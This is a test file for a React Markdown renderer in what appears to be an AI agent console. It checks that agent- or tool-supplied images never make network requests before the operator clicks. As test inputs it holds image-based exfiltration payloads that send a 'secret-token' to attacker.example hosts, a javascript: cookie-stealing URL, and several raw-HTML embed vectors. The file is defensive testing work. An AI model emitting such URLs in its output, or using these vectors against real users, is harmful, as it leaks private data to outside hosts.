// @vitest-environment jsdom

import { act, createElement } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { safeExternalUrl } from "../../../utils/safeExternalUrl";
import { EMBED_SELECTOR, installEgressProbe, type EgressProbe } from "./egressProbe";
import { MarkdownMessage } from "./MarkdownMessage";

vi.mock("../../../utils/safeExternalUrl", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../../../utils/safeExternalUrl")>();
  return { safeExternalUrl: vi.fn<typeof actual.safeExternalUrl>(actual.safeExternalUrl) };
});

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

// Agent- and tool-originated Markdown must make no network request until the operator clicks:
// an image's URL is attacker-chosen and can carry whatever the agent read
// (`![](https://attacker/?d=<private>)`).
describe("MarkdownMessage images", () => {
  let container: HTMLDivElement;
  let root: Root;
  let probe: EgressProbe;
  // Records link activations and stops jsdom from attempting the navigation.
  const opened: string[] = [];
  const recordOpen = (event: MouseEvent) => {
    const anchor = (event.target as Element).closest("a");
    if (anchor) opened.push(anchor.href);
    event.preventDefault();
  };

  beforeEach(() => {
    probe = installEgressProbe();
    opened.length = 0;
    document.addEventListener("click", recordOpen, true);
    vi.mocked(safeExternalUrl).mockClear();
  });

  afterEach(async () => {
    if (root) await act(async () => root.unmount());
    container?.remove();
    document.removeEventListener("click", recordOpen, true);
    probe.restore();
  });

  async function render(message: string) {
    container = document.createElement("div");
    document.body.append(container);
    root = createRoot(container);
    await act(async () => root.render(createElement(MarkdownMessage, { message })));
  }

  const placeholder = () => container.querySelector("[data-markdown-image]");

  it("shows an inert placeholder with the alt text and host instead of loading the image", async () => {
    await render("Here: ![quarterly chart](https://attacker.example/pixel.png?d=secret-token)");

    expect(probe.requests).toEqual([]);
    expect(container.querySelector(EMBED_SELECTOR)).toBeNull();
    expect(placeholder()?.textContent).toContain("quarterly chart");
    expect(placeholder()?.textContent).toContain("attacker.example");
    expect(container.textContent).not.toContain("secret-token");
  });

  it("treats a reference-style image the same way", async () => {
    await render("![logo][l]\n\n[l]: https://cdn.attacker.example/l.png?d=1");

    expect(probe.requests).toEqual([]);
    expect(container.querySelector(EMBED_SELECTOR)).toBeNull();
    expect(placeholder()?.textContent).toContain("cdn.attacker.example");
  });

  it("opens an http(s) image only on click, through safeExternalUrl, in a new tab without a referrer", async () => {
    const url = "https://attacker.example/pixel.png?d=secret-token";
    await render(`![chart](${url})`);

    const open = placeholder()?.closest("a") ?? placeholder()?.querySelector("a");
    expect(safeExternalUrl).toHaveBeenCalledWith(url);
    expect(open?.getAttribute("href")).toBe(safeExternalUrl(url));
    expect(open?.getAttribute("target")).toBe("_blank");
    expect(open?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(probe.requests).toEqual([]);

    await act(async () => open?.click());

    expect(opened).toEqual([url]);
    // Opening navigates a new tab to the URL; it never turns the placeholder into an <img>.
    expect(probe.requests).toEqual([]);
    expect(container.querySelector(EMBED_SELECTOR)).toBeNull();
  });

  it.each([
    ["a data: URL", "data:image/png;base64,iVBORw0KGgo="],
    ["a javascript: URL", "javascript:alert(document.cookie)"],
    ["a relative URL", "/api/private/avatar.png?d=secret"],
    ["a mailto: URL", "mailto:attacker@example.com"],
  ])("renders %s as a placeholder with no action", async (_name, url) => {
    await render(`![shot](${url})`);

    expect(probe.requests).toEqual([]);
    expect(container.querySelector(EMBED_SELECTOR)).toBeNull();
    expect(placeholder()?.textContent).toContain("shot");
    expect(container.querySelector("a")).toBeNull();
    expect(container.querySelector("button")).toBeNull();
  });

  it("keeps an image inside a link inert, leaving the link as the only action", async () => {
    await render("[![badge](https://img.attacker.example/b.svg)](https://example.com/docs)");

    expect(probe.requests).toEqual([]);
    expect(container.querySelector(EMBED_SELECTOR)).toBeNull();
    const anchors = container.querySelectorAll("a");
    expect(anchors).toHaveLength(1);
    expect(anchors[0].getAttribute("href")).toBe("https://example.com/docs");
    expect(placeholder()?.textContent).toContain("img.attacker.example");
  });

  // Every other route to an embed in one message: raw HTML is skipped (`skipHtml`), so <img>,
  // <picture>/<source>, `srcset` and inline `style` with url() never reach the DOM.
  it("loads nothing from any embed vector in a single message", async () => {
    await render([
      "![md](https://a.attacker.example/1.png)",
      "<img src=\"https://b.attacker.example/2.png\" srcset=\"https://b.attacker.example/2x.png 2x\">",
      "<picture><source srcset=\"https://c.attacker.example/3.webp\"><img src=\"https://c.attacker.example/3.png\"></picture>",
      "<div style=\"background-image:url(https://d.attacker.example/4.png)\">x</div>",
      "<video poster=\"https://e.attacker.example/5.png\"></video>",
    ].join("\n\n"));

    expect(probe.requests).toEqual([]);
    expect(container.querySelector(EMBED_SELECTOR)).toBeNull();
  });
});
